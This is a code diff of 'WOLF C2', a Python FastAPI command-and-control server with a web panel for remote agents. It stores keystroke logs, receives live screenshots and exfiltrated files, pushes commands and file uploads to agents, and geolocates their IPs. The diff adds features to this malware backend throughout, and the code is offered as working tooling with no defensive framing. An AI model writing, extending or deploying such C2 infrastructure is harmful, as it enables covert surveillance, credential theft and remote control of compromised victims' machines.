@@ -1,7 +1,7 @@
-"""WOLF C2 — FastAPI agent gateway + browser control panel.
+"""WOLF C2 â€” FastAPI agent gateway + browser control panel.
 
-Deploy target: Render (see render.yaml).
-Agents connect over WSS, the panel talks to the same origin.
+Deploy target: Render (render.yaml at repo root).
+One websocket per agent, one per panel. Binary frames = screen previews.
 """
 from __future__ import annotations
 
@@ -14,8 +14,10 @@ import os
 import secrets
 import sqlite3
 import time
+import urllib.request
 import uuid
 from pathlib import Path
+from typing import Any
 
 from fastapi import (Depends, FastAPI, File, Form, HTTPException, Request,
                      UploadFile, WebSocket, WebSocketDisconnect)
@@ -29,9 +31,7 @@ from fastapi.templating import Jinja2Templates
 # --------------------------------------------------------------------------
 BASE = Path(__file__).resolve().parent
 DATA = Path(os.environ.get("DATA_DIR", str(BASE / "data")))
-FILES = DATA / "files"
 DATA.mkdir(parents=True, exist_ok=True)
-FILES.mkdir(parents=True, exist_ok=True)
 
 PANEL_PASSWORD = os.environ.get("PANEL_PASSWORD", "")
 if not PANEL_PASSWORD:
@@ -48,6 +48,7 @@ if not AGENT_TOKEN:
 COOKIE = "wr_panel"
 TTL = 7 * 24 * 3600
 CHUNK = 256 * 1024
+GEO = os.environ.get("GEO_LOOKUP", "1") != "0"
 
 app = FastAPI(title="wr-c2", docs_url=None, redoc_url=None)
 app.mount("/static", StaticFiles(directory=str(BASE / "static")), name="static")
@@ -59,7 +60,8 @@ templates = Jinja2Templates(directory=str(BASE / "templates"))
 SCHEMA = """
 CREATE TABLE IF NOT EXISTS agents(
   id TEXT PRIMARY KEY, host TEXT, user TEXT, os TEXT, arch TEXT, pid INTEGER,
-  admin INTEGER, ip TEXT, first_seen REAL, last_seen REAL, note TEXT
+  admin INTEGER, ip TEXT, first_seen REAL, last_seen REAL, meta TEXT,
+  country TEXT, cc TEXT, note TEXT
 );
 CREATE TABLE IF NOT EXISTS commands(
   id TEXT PRIMARY KEY, agent_id TEXT, module TEXT, args TEXT, created REAL,
@@ -82,11 +84,17 @@ def db() -> sqlite3.Connection:
     con = sqlite3.connect(DATA / "c2.db", timeout=10)
     con.row_factory = sqlite3.Row
     con.execute("PRAGMA journal_mode=WAL")
+    con.execute("PRAGMA synchronous=NORMAL")
     return con
 
 
 with db() as _con:
     _con.executescript(SCHEMA)
+    have = {r["name"] for r in _con.execute("PRAGMA table_info(agents)")}
+    for col in ("meta", "country", "cc", "note"):
+        if col not in have:
+            _con.execute(f"ALTER TABLE agents ADD COLUMN {col} TEXT")
+    _con.commit()
 
 
 def q(sql: str, params: tuple = ()) -> list[dict]:
@@ -116,10 +124,9 @@ def verify(token: str | None) -> bool:
     if not hmac.compare_digest(mac, want):
         return False
     try:
-        exp = int(payload.split("|")[1])
+        return int(payload.split("|")[1]) > time.time()
     except (IndexError, ValueError):
         return False
-    return exp > time.time()
 
 
 def require_panel(request: Request) -> None:
@@ -131,9 +138,6 @@ def agent_ok(token: str | None) -> bool:
     return bool(token) and hmac.compare_digest(token, AGENT_TOKEN)
 
 
-# --------------------------------------------------------------------------
-# live sessions
-# --------------------------------------------------------------------------
 class AgentSession:
     def __init__(self, aid: str, ws: WebSocket):
         self.id = aid
@@ -141,6 +145,10 @@ class AgentSession:
         self.queue: asyncio.Queue = asyncio.Queue()
         self.last_seen = time.time()
         self.info: dict = {}
+        self.ping_ms = None
+        self.preview: bytes | None = None
+        self.preview_ts = 0.0
+        self.frame_no = 0
 
 
 LIVE: dict[str, AgentSession] = {}
@@ -149,8 +157,10 @@ XFERS: dict[str, dict] = {}
 
 
 async def pub(payload: dict) -> None:
+    if not PANELS:
+        return
     dead = []
-    text = json.dumps(payload)
+    text = json.dumps(payload, separators=(",", ":"))
     for ws in list(PANELS):
         try:
             await ws.send_text(text)
@@ -160,12 +170,50 @@ async def pub(payload: dict) -> None:
         PANELS.discard(ws)
 
 
+def card(aid: str) -> dict | None:
+    rows = q("SELECT * FROM agents WHERE id=?", (aid,))
+    if not rows:
+        return None
+    row = rows[0]
+    sess = LIVE.get(aid)
+    meta = {}
+    try:
+        meta = json.loads(row.get("meta") or "{}")
+    except Exception:
+        pass
+    return {
+        "id": row["id"],
+        "host": row["host"],
+        "user": row["user"],
+        "os": row["os"],
+        "os_short": meta.get("os_short") or "",
+        "arch": row["arch"],
+        "pid": row["pid"],
+        "admin": bool(row["admin"]),
+        "ip": row["ip"],
+        "cc": row.get("cc") or "",
+        "country": row.get("country") or "",
+        "cpu": meta.get("cpu") or "",
+        "ram": meta.get("ram") or 0,
+        "gpu": meta.get("gpu") or "",
+        "monitors": meta.get("monitors") or 1,
+        "ver": meta.get("ver") or "",
+        "tag": meta.get("tag") or "",
+        "first_seen": row["first_seen"],
+        "last_seen": row["last_seen"],
+        "online": sess is not None,
+        "ping": (round(sess.ping_ms, 1) if sess and sess.ping_ms is not None else None),
+        "frame": sess.frame_no if sess else 0,
+        "has_preview": bool(sess and sess.preview),
+    }
+
+
 # --------------------------------------------------------------------------
 # pages
 # --------------------------------------------------------------------------
 @app.get("/health")
 async def health():
-    return {"ok": True, "agents": len(LIVE), "ts": time.time()}
+    return {"ok": True, "agents": len(LIVE), "panels": len(PANELS), "ts": time.time()}
 
 
 @app.get("/login", response_class=HTMLResponse)
@@ -177,8 +225,8 @@ async def login_page(request: Request):
 async def login(request: Request, password: str = Form(...)):
     if not hmac.compare_digest(password, PANEL_PASSWORD):
         return RedirectResponse("/login?e=1", status_code=303)
-    resp = RedirectResponse("/", status_code=303)
     payload = f"panel|{int(time.time()) + TTL}"
+    resp = RedirectResponse("/", status_code=303)
     resp.set_cookie(COOKIE, sign(payload), max_age=TTL, httponly=True,
                     samesite="lax", secure=request.url.scheme == "https")
     return resp
@@ -201,26 +249,42 @@ async def index(request: Request):
 # --------------------------------------------------------------------------
 # panel api
 # --------------------------------------------------------------------------
+@app.get("/api/state", dependencies=[Depends(require_panel)])
+async def api_state():
+    rows = q("SELECT id FROM agents ORDER BY last_seen DESC")
+    return {
+        "agents": [c for c in (card(r["id"]) for r in rows) if c],
+        "online": len(LIVE),
+        "ts": time.time(),
+    }
+
+
 @app.get("/api/agents", dependencies=[Depends(require_panel)])
 async def api_agents():
-    rows = q("SELECT * FROM agents ORDER BY last_seen DESC")
-    for r in rows:
-        r["online"] = r["id"] in LIVE
-    return {"agents": rows}
+    rows = q("SELECT id FROM agents ORDER BY last_seen DESC")
+    return {"agents": [c for c in (card(r["id"]) for r in rows) if c]}
 
 
 @app.get("/api/agents/{aid}", dependencies=[Depends(require_panel)])
 async def api_agent(aid: str):
-    rows = q("SELECT * FROM agents WHERE id=?", (aid,))
-    if not rows:
+    c = card(aid)
+    if not c:
         raise HTTPException(404, "no such agent")
-    agent = rows[0]
-    agent["online"] = aid in LIVE
     return {
-        "agent": agent,
-        "commands": q("SELECT * FROM commands WHERE agent_id=? ORDER BY created DESC LIMIT 100", (aid,)),
-        "files": q("SELECT id,kind,path,name,size,ts FROM files WHERE agent_id=? ORDER BY ts DESC LIMIT 100", (aid,)),
+        "agent": c,
+        "commands": q("SELECT * FROM commands WHERE agent_id=? ORDER BY created DESC LIMIT 150", (aid,)),
+        "files": q("SELECT id,kind,path,name,size,ts FROM files WHERE agent_id=? ORDER BY ts DESC LIMIT 200", (aid,)),
+        "keylogs": q("SELECT ts,text FROM keylogs WHERE agent_id=? ORDER BY id DESC LIMIT 400", (aid,)),
     }
+
+
+@app.get("/api/agents/{aid}/preview.jpg", dependencies=[Depends(require_panel)])
+async def api_preview(aid: str):
+    sess = LIVE.get(aid)
+    if not sess or not sess.preview:
+        return Response(status_code=204)
+    return Response(content=sess.preview, media_type="image/jpeg",
+                    headers={"Cache-Control": "no-store"})
 
 
 @app.post("/api/agents/{aid}/cmd", dependencies=[Depends(require_panel)])
@@ -230,13 +294,14 @@ async def api_cmd(aid: str, body: dict):
         raise HTTPException(409, "agent offline")
     module = str(body.get("module", ""))[:64]
     args = body.get("args") or {}
+    silent = bool(body.get("silent"))
     if not module:
         raise HTTPException(400, "module required")
     cid = uuid.uuid4().hex
     x("INSERT INTO commands(id,agent_id,module,args,created,status) VALUES(?,?,?,?,?,'queued')",
       (cid, aid, module, json.dumps(args), time.time()))
     await sess.queue.put({"type": "cmd", "id": cid, "module": module, "args": args})
-    return {"id": cid}
+    return {"id": cid, "silent": silent}
 
 
 @app.get("/api/files/{fid}", dependencies=[Depends(require_panel)])
@@ -248,16 +313,22 @@ async def api_file(fid: str):
     name = row["name"] or "download.bin"
     ext = Path(name).suffix.lower()
     mime = {".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
-            ".gif": "image/gif", ".txt": "text/plain; charset=utf-8",
-            ".json": "application/json", ".zip": "application/zip"}.get(ext, "application/octet-stream")
+            ".gif": "image/gif", ".wav": "audio/wav", ".mp3": "audio/mpeg",
+            ".txt": "text/plain; charset=utf-8", ".json": "application/json",
+            ".zip": "application/zip"}.get(ext, "application/octet-stream")
     return Response(content=row["data"], media_type=mime,
                     headers={"Content-Disposition": f'attachment; filename="{name}"'})
 
 
+@app.delete("/api/files/{fid}", dependencies=[Depends(require_panel)])
+async def api_file_delete(fid: str):
+    x("DELETE FROM files WHERE id=?", (fid,))
+    return {"ok": True}
+
+
 @app.get("/api/agents/{aid}/keylogs", dependencies=[Depends(require_panel)])
 async def api_keylogs(aid: str):
-    rows = q("SELECT ts,text FROM keylogs WHERE agent_id=? ORDER BY id ASC LIMIT 5000", (aid,))
-    return {"logs": rows}
+    return {"logs": q("SELECT ts,text FROM keylogs WHERE agent_id=? ORDER BY id ASC LIMIT 5000", (aid,))}
 
 
 @app.delete("/api/agents/{aid}", dependencies=[Depends(require_panel)])
@@ -269,10 +340,9 @@ async def api_delete(aid: str, purge: bool = False):
         except Exception:
             pass
     if purge:
-        x("DELETE FROM agents WHERE id=?", (aid,))
-        x("DELETE FROM commands WHERE agent_id=?", (aid,))
-        x("DELETE FROM files WHERE agent_id=?", (aid,))
-        x("DELETE FROM keylogs WHERE agent_id=?", (aid,))
+        for table in ("agents", "commands", "files", "keylogs"):
+            x(f"DELETE FROM {table} WHERE id=?" if table == "agents" else f"DELETE FROM {table} WHERE agent_id=?",
+              (aid,))
     await pub({"t": "agent", "agent": {"id": aid, "online": False, "removed": purge}})
     return {"ok": True}
 
@@ -286,14 +356,16 @@ async def api_upload(aid: str, path: str = Form(...), file: UploadFile = File(..
     tid = uuid.uuid4().hex
     total = max(1, (len(blob) + CHUNK - 1) // CHUNK)
     for i in range(total):
-        slice_ = blob[i * CHUNK:(i + 1) * CHUNK]
+        part = blob[i * CHUNK:(i + 1) * CHUNK]
         cid = uuid.uuid4().hex
         args = {"path": path, "tid": tid, "seq": i, "total": total,
-                "data": base64.b64encode(slice_).decode(), "silent": i < total - 1}
+                "data": base64.b64encode(part).decode()}
         x("INSERT INTO commands(id,agent_id,module,args,created,status) VALUES(?,?,?,?,?,'queued')",
           (cid, aid, "upload", json.dumps(args), time.time()))
-        await sess.queue.put({"type": "cmd", "id": cid, "module": "upload",
-                              "args": {k: v for k, v in args.items() if k != "silent"}})
+        await sess.queue.put({"type": "cmd", "id": cid, "module": "upload", "args": args})
+        if total > 1:
+            await pub({"t": "progress", "agent_id": aid, "xid": tid,
+                       "pct": round((i + 1) * 100 / total), "kind": "upload"})
     return {"ok": True, "tid": tid, "chunks": total, "size": len(blob)}
 
 
@@ -308,6 +380,7 @@ async def panel_ws(ws: WebSocket):
     await ws.accept()
     PANELS.add(ws)
     try:
+        await ws.send_text(json.dumps({"t": "hello", "ts": time.time()}))
         while True:
             await ws.receive_text()
     except (WebSocketDisconnect, Exception):
@@ -321,25 +394,51 @@ async def panel_ws(ws: WebSocket):
 # --------------------------------------------------------------------------
 @app.websocket("/ws")
 async def agent_ws(ws: WebSocket):
-    token = ws.headers.get("x-agent-token") or ws.query_params.get("t")
-    if not agent_ok(token):
+    if not agent_ok(ws.headers.get("x-agent-token") or ws.query_params.get("t")):
         await ws.close(code=1008)
         return
     await ws.accept()
 
     sess: AgentSession | None = None
+    send_task: asyncio.Task | None = None
+    ping_task: asyncio.Task | None = None
 
     async def sender():
         assert sess
         while True:
             msg = await sess.queue.get()
-            await ws.send_text(json.dumps(msg))
+            await ws.send_text(json.dumps(msg, separators=(",", ":")))
 
-    send_task = None
+    async def pinger():
+        assert sess
+        while True:
+            await asyncio.sleep(10)
+            try:
+                await ws.send_text(json.dumps({"type": "ping", "ts": time.perf_counter()}))
+            except Exception:
+                return
+
     try:
         while True:
-            raw = await ws.receive_text()
-            msg = json.loads(raw)
+            frame = await ws.receive()
+
+            if frame.get("type") == "websocket.disconnect":
+                break
+
+            blob = frame.get("bytes")
+            if blob is not None:
+                if sess and blob[:2] == b"\xff\xd8":  # JPEG magic
+                    sess.preview = blob
+                    sess.preview_ts = time.time()
+                    sess.frame_no += 1
+                    await pub({"t": "frame", "agent_id": sess.id,
+                               "ts": sess.preview_ts, "n": sess.frame_no})
+                continue
+
+            text = frame.get("text")
+            if not text:
+                continue
+            msg = json.loads(text)
             kind = msg.get("type")
 
             if kind == "hello":
@@ -348,44 +447,49 @@ async def agent_ws(ws: WebSocket):
                     sess = AgentSession(aid, ws)
                     LIVE[aid] = sess
                     send_task = asyncio.create_task(sender())
-                    await pub({"t": "agent", "agent": {"id": aid, "online": True,
-                                                       "host": msg.get("host")}})
+                    ping_task = asyncio.create_task(pinger())
                 sess.info = msg
                 sess.last_seen = time.time()
                 now = time.time()
-                x("""INSERT INTO agents(id,host,user,os,arch,pid,admin,ip,first_seen,last_seen)
-                     VALUES(?,?,?,?,?,?,?,?,?,?)
+                meta = {k: v for k, v in msg.items()
+                        if k in ("os_short", "cpu", "ram", "gpu", "monitors", "ver", "tag", "domain")}
+                ip = ws.client.host if ws.client else None
+                x("""INSERT INTO agents(id,host,user,os,arch,pid,admin,ip,first_seen,last_seen,meta)
+                     VALUES(?,?,?,?,?,?,?,?,?,?,?)
                      ON CONFLICT(id) DO UPDATE SET host=excluded.host,user=excluded.user,
                        os=excluded.os,arch=excluded.arch,pid=excluded.pid,admin=excluded.admin,
-                       ip=excluded.ip,last_seen=excluded.last_seen""",
+                       ip=excluded.ip,last_seen=excluded.last_seen,meta=excluded.meta""",
                   (aid, msg.get("host"), msg.get("user"), msg.get("os"), msg.get("arch"),
-                   msg.get("pid") or 0, 1 if msg.get("admin") else 0,
-                   ws.client.host if ws.client else None, now, now))
-                await pub({"t": "agent", "agent": {
-                    "id": aid, "online": True, "host": msg.get("host"),
-                    "user": msg.get("user"), "os": msg.get("os"), "arch": msg.get("arch"),
-                    "admin": bool(msg.get("admin")), "pid": msg.get("pid"),
-                    "last_seen": now}})
+                   msg.get("pid") or 0, 1 if msg.get("admin") else 0, ip, now, now,
+                   json.dumps(meta)))
+                c = card(aid)
+                if c:
+                    await pub({"t": "agent", "agent": c})
+                if GEO and ip:
+                    asyncio.create_task(geo_lookup(aid, ip))
 
             elif kind == "pong":
                 if sess:
                     sess.last_seen = time.time()
+                    sent = msg.get("ts")
+                    if isinstance(sent, (int, float)) and sent > 0:
+                        rtt = (time.perf_counter() - sent) * 1000.0
+                        if 0 <= rtt < 60000:
+                            sess.ping_ms = rtt
+                            await pub({"t": "ping", "agent_id": sess.id,
+                                       "ms": round(rtt, 1)})
 
             elif kind == "result" and sess:
                 cid = msg.get("id")
                 body = msg.get("body") or {}
                 x("UPDATE commands SET status='done', ok=?, body=? WHERE id=?",
                   (1 if body.get("ok") else 0, json.dumps(body), cid))
-                row = q("SELECT args FROM commands WHERE id=?", (cid,))
-                silent = False
+                module = ""
+                row = q("SELECT module, args FROM commands WHERE id=?", (cid,))
                 if row:
-                    try:
-                        silent = bool(json.loads(row[0]["args"]).get("silent"))
-                    except Exception:
-                        pass
-                if not silent:
-                    await pub({"t": "result", "agent_id": sess.id, "cmd_id": cid,
-                               "body": body})
+                    module = row[0]["module"]
+                await pub({"t": "result", "agent_id": sess.id, "cmd_id": cid,
+                           "module": module, "body": body})
                 sess.last_seen = time.time()
 
             elif kind == "event" and sess:
@@ -396,8 +500,9 @@ async def agent_ws(ws: WebSocket):
     except Exception as exc:  # noqa: BLE001
         print("[ws] agent error:", exc, flush=True)
     finally:
-        if send_task:
-            send_task.cancel()
+        for task in (send_task, ping_task):
+            if task:
+                task.cancel()
         if sess and LIVE.get(sess.id) is sess:
             LIVE.pop(sess.id, None)
             x("UPDATE agents SET last_seen=? WHERE id=?", (time.time(), sess.id))
@@ -410,19 +515,38 @@ async def handle_event(sess: AgentSession, msg: dict) -> None:
     if kind == "keylog":
         text = str(msg.get("data", ""))[:20000]
         if text:
-            x("INSERT INTO keylogs(agent_id,ts,text) VALUES(?,?,?)",
-              (sess.id, time.time(), text))
+            x("INSERT INTO keylogs(agent_id,ts,text) VALUES(?,?,?)", (sess.id, time.time(), text))
             await pub({"t": "keylog", "agent_id": sess.id, "text": text})
 
+    elif kind == "log":
+        await pub({"t": "log", "agent_id": sess.id, "text": str(msg.get("data", ""))[:2000]})
+
+    elif kind == "progress":
+        await pub({"t": "progress", "agent_id": sess.id,
+                   "xid": msg.get("xfer"), "pct": msg.get("pct"), "kind": "transfer"})
+
+    elif kind == "xfer:start":
+        XFERS[f"{sess.id}:{msg.get('xfer')}"] = {
+            "buf": bytearray(), "name": msg.get("name"),
+            "meta": msg.get("meta") or {}, "total": int(msg.get("total") or 1),
+        }
+        await pub({"t": "progress", "agent_id": sess.id, "xid": msg.get("xfer"),
+                   "pct": 0, "kind": "transfer", "name": msg.get("name"),
+                   "size": msg.get("size")})
+
     elif kind == "xfer":
-        xid = msg.get("xfer")
-        key = f"{sess.id}:{xid}"
+        key = f"{sess.id}:{msg.get('xfer')}"
         seq = int(msg.get("seq") or 0)
         total = int(msg.get("total") or 1)
-        blob = base64.b64decode(msg.get("data") or "")
         state = XFERS.setdefault(key, {"buf": bytearray(), "name": msg.get("name"),
                                        "meta": msg.get("meta") or {}, "total": total})
-        state["buf"].extend(blob)
+        try:
+            state["buf"].extend(base64.b64decode(msg.get("data") or ""))
+        except Exception:
+            pass
+        if total > 1:
+            await pub({"t": "progress", "agent_id": sess.id, "xid": msg.get("xfer"),
+                       "pct": round((seq + 1) * 100 / total), "kind": "transfer"})
         if seq + 1 >= total:
             XFERS.pop(key, None)
             meta = state["meta"] or {}
@@ -436,5 +560,25 @@ async def handle_event(sess: AgentSession, msg: dict) -> None:
                 "id": fid, "kind": state["name"], "name": name,
                 "path": path, "size": len(data), "ts": time.time()}})
 
-    elif kind == "log":
-        await pub({"t": "log", "agent_id": sess.id, "text": str(msg.get("data", ""))[:2000]})
+
+async def geo_lookup(aid: str, ip: str) -> None:
+    if ip.startswith(("127.", "10.", "192.168.", "172.", "::1")):
+        return
+    try:
+        def fetch() -> dict:
+            req = urllib.request.Request(f"https://ipapi.co/{ip}/json/",
+                                         headers={"User-Agent": "curl/8.5.0"})
+            with urllib.request.urlopen(req, timeout=5) as r:
+                return json.loads(r.read().decode())
+
+        d = await asyncio.to_thread(fetch)
+        cc = (d.get("country_code") or "")[:4]
+        name = (d.get("country_name") or "")[:64]
+        if cc:
+            x("UPDATE agents SET cc=?, country=? WHERE id=?", (cc, name, aid))
+            c = card(aid)
+            if c:
+                await pub({"t": "agent", "agent": c})
+    except Exception:
+        pass
+
